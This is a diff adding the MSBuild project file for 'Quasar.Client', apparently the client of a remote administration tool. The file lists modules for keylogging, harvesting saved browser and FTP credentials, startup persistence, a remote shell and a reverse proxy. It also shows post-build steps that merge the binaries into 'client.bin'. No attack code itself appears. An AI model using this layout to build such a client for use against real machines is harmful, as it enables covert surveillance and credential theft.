@@ -1,0 +1,160 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>8.0.30703</ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{9F5CF56A-DDB2-4F40-AB99-2A1DC47588E1}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>Quasar.Client</RootNamespace>
+    <AssemblyName>Client</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <TargetFrameworkProfile>Client</TargetFrameworkProfile>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <DebugSymbols>false</DebugSymbols>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>Quasar.Client.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Gma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\MouseKeyHook.5.6.0\lib\net40\Gma.System.MouseKeyHook.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="protobuf-net, Version=2.4.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67, processorArchitecture=MSIL">
+      <HintPath>..\packages\protobuf-net.2.4.0\lib\net40\protobuf-net.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Configuration" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.ServiceModel" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Commands\RegistryHandler.cs" />
+    <Compile Include="Commands\TcpConnectionsHandler.cs" />
+    <Compile Include="Data\ClientData.cs" />
+    <Compile Include="Data\GeoInformation.cs" />
+    <Compile Include="Helper\MutexHelper.cs" />
+    <Compile Include="Helper\WindowsAccountHelper.cs" />
+    <Compile Include="Helper\HostHelper.cs" />
+    <Compile Include="Helper\NativeMethodsHelper.cs" />
+    <Compile Include="Helper\RegistryKeyHelper.cs" />
+    <Compile Include="Helper\ScreenHelper.cs" />
+    <Compile Include="Helper\DevicesHelper.cs" />
+    <Compile Include="Helper\SystemHelper.cs" />
+    <Compile Include="Installation\ClientInstaller.cs" />
+    <Compile Include="Installation\ClientUninstaller.cs" />
+    <Compile Include="Installation\ClientUpdater.cs" />
+    <Compile Include="Installation\Startup.cs" />
+    <Compile Include="IO\BatchFile.cs" />
+    <Compile Include="Networking\Client.cs" />
+    <Compile Include="Commands\CommandHandler.cs" />
+    <Compile Include="Commands\ConnectionHandler.cs" />
+    <Compile Include="Commands\FileHandler.cs" />
+    <Compile Include="Commands\MiscHandler.cs" />
+    <Compile Include="Commands\SurveillanceHandler.cs" />
+    <Compile Include="Commands\SystemHandler.cs" />
+    <Compile Include="Extensions\RegistryKeyExtensions.cs" />
+    <Compile Include="Networking\PacketHandler.cs" />
+    <Compile Include="Networking\QuasarClient.cs" />
+    <Compile Include="Recovery\FtpClients\FileZilla.cs" />
+    <Compile Include="Recovery\FtpClients\WinSCP.cs" />
+    <Compile Include="Registry\RegistryEditor.cs" />
+    <Compile Include="Registry\RegistrySeeker.cs" />
+    <Compile Include="Data\Host.cs" />
+    <Compile Include="Utilities\HostsManager.cs" />
+    <Compile Include="Utilities\NativeMethods.cs" />
+    <Compile Include="Helper\KeyloggerHelper.cs" />
+    <Compile Include="Utilities\Shell.cs" />
+    <Compile Include="Recovery\Browsers\Chrome.cs" />
+    <Compile Include="Recovery\Browsers\Firefox.cs" />
+    <Compile Include="Recovery\Utilities\Chromium.cs" />
+    <Compile Include="Recovery\Utilities\JsonUtil.cs" />
+    <Compile Include="Recovery\Utilities\SQLiteHandler.cs" />
+    <Compile Include="Recovery\Browsers\InternetExplorer.cs" />
+    <Compile Include="Recovery\Browsers\Opera.cs" />
+    <Compile Include="Recovery\Browsers\Yandex.cs" />
+    <Compile Include="ReverseProxy\ReverseProxyClient.cs" />
+    <Compile Include="ReverseProxy\ReverseProxyCommandHandler.cs" />
+    <Compile Include="Helper\GeoLocationHelper.cs" />
+    <Compile Include="Utilities\Keylogger.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Config\Settings.cs" />
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="app.manifest" />
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\Quasar.Common\Quasar.Common.csproj">
+      <Project>{c7c363ba-e5b6-4e18-9224-39bc8da73172}</Project>
+      <Name>Quasar.Common</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <ItemGroup />
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PostBuildEvent Condition="'$(OS)' == 'Windows_NT' ">copy "$(TargetPath)" "$(TargetDir)client.bin" /Y</PostBuildEvent>
+    <PostBuildEvent Condition="'$(OS)' != 'Windows_NT' ">cp "$(TargetPath)" "$(TargetDir)client.bin"</PostBuildEvent>
+  </PropertyGroup>
+  <PropertyGroup>
+    <PostBuildEvent>"$(SolutionDir)packages\ILMerge.2.14.1208\tools\ILMerge.exe" /out:"$(TargetDir)$(TargetName).all.exe" "$(TargetPath)" "$(TargetDir)protobuf-net.dll" "$(TargetDir)Gma.System.MouseKeyHook.dll" "$(TargetDir)Quasar.Common.dll" /target:WinExe /wildcards /internalize
+copy "$(TargetDir)$(TargetName).all.exe" "$(TargetDir)client.bin" /Y</PostBuildEvent>
+  </PropertyGroup>
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
